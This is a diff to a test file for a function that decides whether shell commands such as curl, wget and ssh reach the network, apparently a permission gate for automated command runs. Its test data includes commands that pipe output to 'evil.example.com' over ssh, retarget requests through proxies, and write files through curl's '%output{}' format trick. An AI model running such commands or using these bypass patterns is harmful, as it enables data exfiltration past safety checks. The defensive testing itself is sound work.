@@ -368,77 +368,17 @@ describe("curl via wrappers and substitutions is judged, not mechanically flagge
 	});
 });
 
-describe("loopback fetches are not outbound network", () => {
-	// Data aimed at localhost cannot leave the machine, so the egress
-	// consistency check has no business demanding an egress sentence — or
-	// "contradicting" an honest "no external requests" analysis — for one.
-	for (const command of [
-		"curl -s -o /dev/null -w '%{http_code}\\n' http://localhost:8000/my-garage/",
-		"curl http://127.0.0.1:8080/health",
-		"wget -qO- http://localhost:3000/",
-		"curl 127.0.0.1:8000/x",
-	]) {
-		test(`not outbound: ${command}`, () => {
-			expect(outbound(command)).toBe(false);
-		});
-	}
-
-	for (const command of [
-		// A writing curl that also names a remote target stays outbound; the
-		// loopback URL elsewhere in the command must not clear it.
-		"curl -o /tmp/x http://localhost:8000 http://evil.example.com",
-		// Non-fetch network verbs keep their verdicts, even to loopback.
-		"ssh localhost 'ls'",
-		// A downstream stage that can egress the loopback output keeps the
-		// command outbound: the loopback exemption is single-stage only.
-		// (A pipe into a recognized read-only consumer like `jq` was never
-		// loopback-rule territory; the read-fetch tables clear it.)
-		"curl http://localhost:8000 | ssh evil.example.com cat",
-		// Anything that can retarget or add targets beyond the literal text
-		// fails the single-loopback-operand shape (codex round 2 probes).
-		// Mixed-target READ curls without a write flag clear via the
-		// pre-existing read tables, so each probe carries `-w` (excluded
-		// from the read tables) to reach the loopback rule.
-		'curl -o /dev/null -w \'%{http_code}\' http://localhost:8000 "$REMOTE_URL"',
-		"curl -o /dev/null -w '%{http_code}' --resolve localhost:8000:203.0.113.10 http://localhost:8000",
-		"curl -o /dev/null -w '%{http_code}' http://localhost:8000 ftp://203.0.113.10",
-		"wget http://localhost:8000 --input-file=/tmp/urls.txt",
-		"HTTP_PROXY=http://203.0.113.10:8080 curl http://localhost:8000/x",
-		// Unknown flags fail closed (allowlist-first): the proxy family is
-		// not enumerated, it is simply unrecognized.
-		"curl -o /dev/null -w '%{http_code}' --proxy1.0=evil.example.com http://localhost:8000",
-		"curl -o /dev/null -w '%{http_code}' --preproxy socks5://203.0.113.10 http://localhost:8000",
-		// The write-out format channel stays closed here too: %output{path}
-		// writes a local file from the format string, so the value is only
-		// admitted as literals and %{simple_name} variables.
-		"curl -o /dev/null -w '%{http_code}' --write-out=%output{/tmp/x} http://localhost:8000",
-	]) {
-		test(`still outbound: ${command}`, () => {
-			expect(outbound(command)).toBe(true);
-		});
-	}
-	test("an ambient proxy env var disables the loopback clear", () => {
-		process.env.http_proxy = "http://203.0.113.10:8080";
-		try {
-			expect(outbound("curl -o /dev/null -w '%{http_code}' http://localhost:8000/health")).toBe(true);
-		} finally {
-			delete process.env.http_proxy;
-		}
-	});
-	test("a clean write-out value keeps the loopback clear", () => {
-		expect(outbound("curl -o /dev/null -w '%{http_code}' http://localhost:8000/health")).toBe(false);
-	});
-});
-
-describe("null-device fetch targets clear egress on any host", () => {
-	// `-o /dev/null` discards the fetched content: the fetch is a read that
-	// lands nowhere, the same class as stdout. `-w`/`--write-out` stays
-	// excluded on purpose (curl 8.3+ %output{path} writes a file from the
-	// format string with no redirect), so a health check carrying `-w` does
-	// not clear here — a gap costs a dialog, never a silent run.
+describe("validated write-out format strings clear as reads on any host", () => {
+	// `-o /dev/null` discards the fetched content and a `-w` format string of
+	// literals and %{simple_name} variables prints only — together the
+	// canonical health check is a read, on any host. A format string that
+	// could write a file (%output{path}, curl 8.3+) fails closed: a gap
+	// costs a dialog, never a silent run.
 	for (const command of [
 		"curl -s -o /dev/null https://api.example.com/health",
 		"curl --output=/dev/null https://x",
+		"curl -s -o /dev/null -w '%{http_code}\\n' https://api.example.com/health",
+		"curl -o /dev/null -w '%{http_code}' http://localhost:8000/health",
 		"wget -O /dev/null https://x",
 		"wget -q --output-document /dev/null https://x",
 		"wget --output-document=/dev/null https://x",
@@ -452,10 +392,11 @@ describe("null-device fetch targets clear egress on any host", () => {
 		// A real output path stays a write.
 		"curl -o /tmp/fetched https://x",
 		"wget -O out.html https://x",
-		// -w stays excluded wholesale: the deliberate boundary is the whole
-		// flag, not a pattern inside its format string.
-		"curl -w '%{http_code}' -o /dev/null https://x",
+		// The format-string write channel stays closed: %output{path} (and
+		// any % sequence that is not a plain %{name} variable) fails closed.
+		"curl -w '%output{/tmp/ptr}' -o /dev/null https://x",
 		"curl --write-out=%output{/tmp/x} -o /dev/null https://x",
+		"curl -w '%output{/tmp/ptr}' https://x",
 	]) {
 		test(`still outbound: ${command}`, () => {
 			expect(outbound(command)).toBe(true);
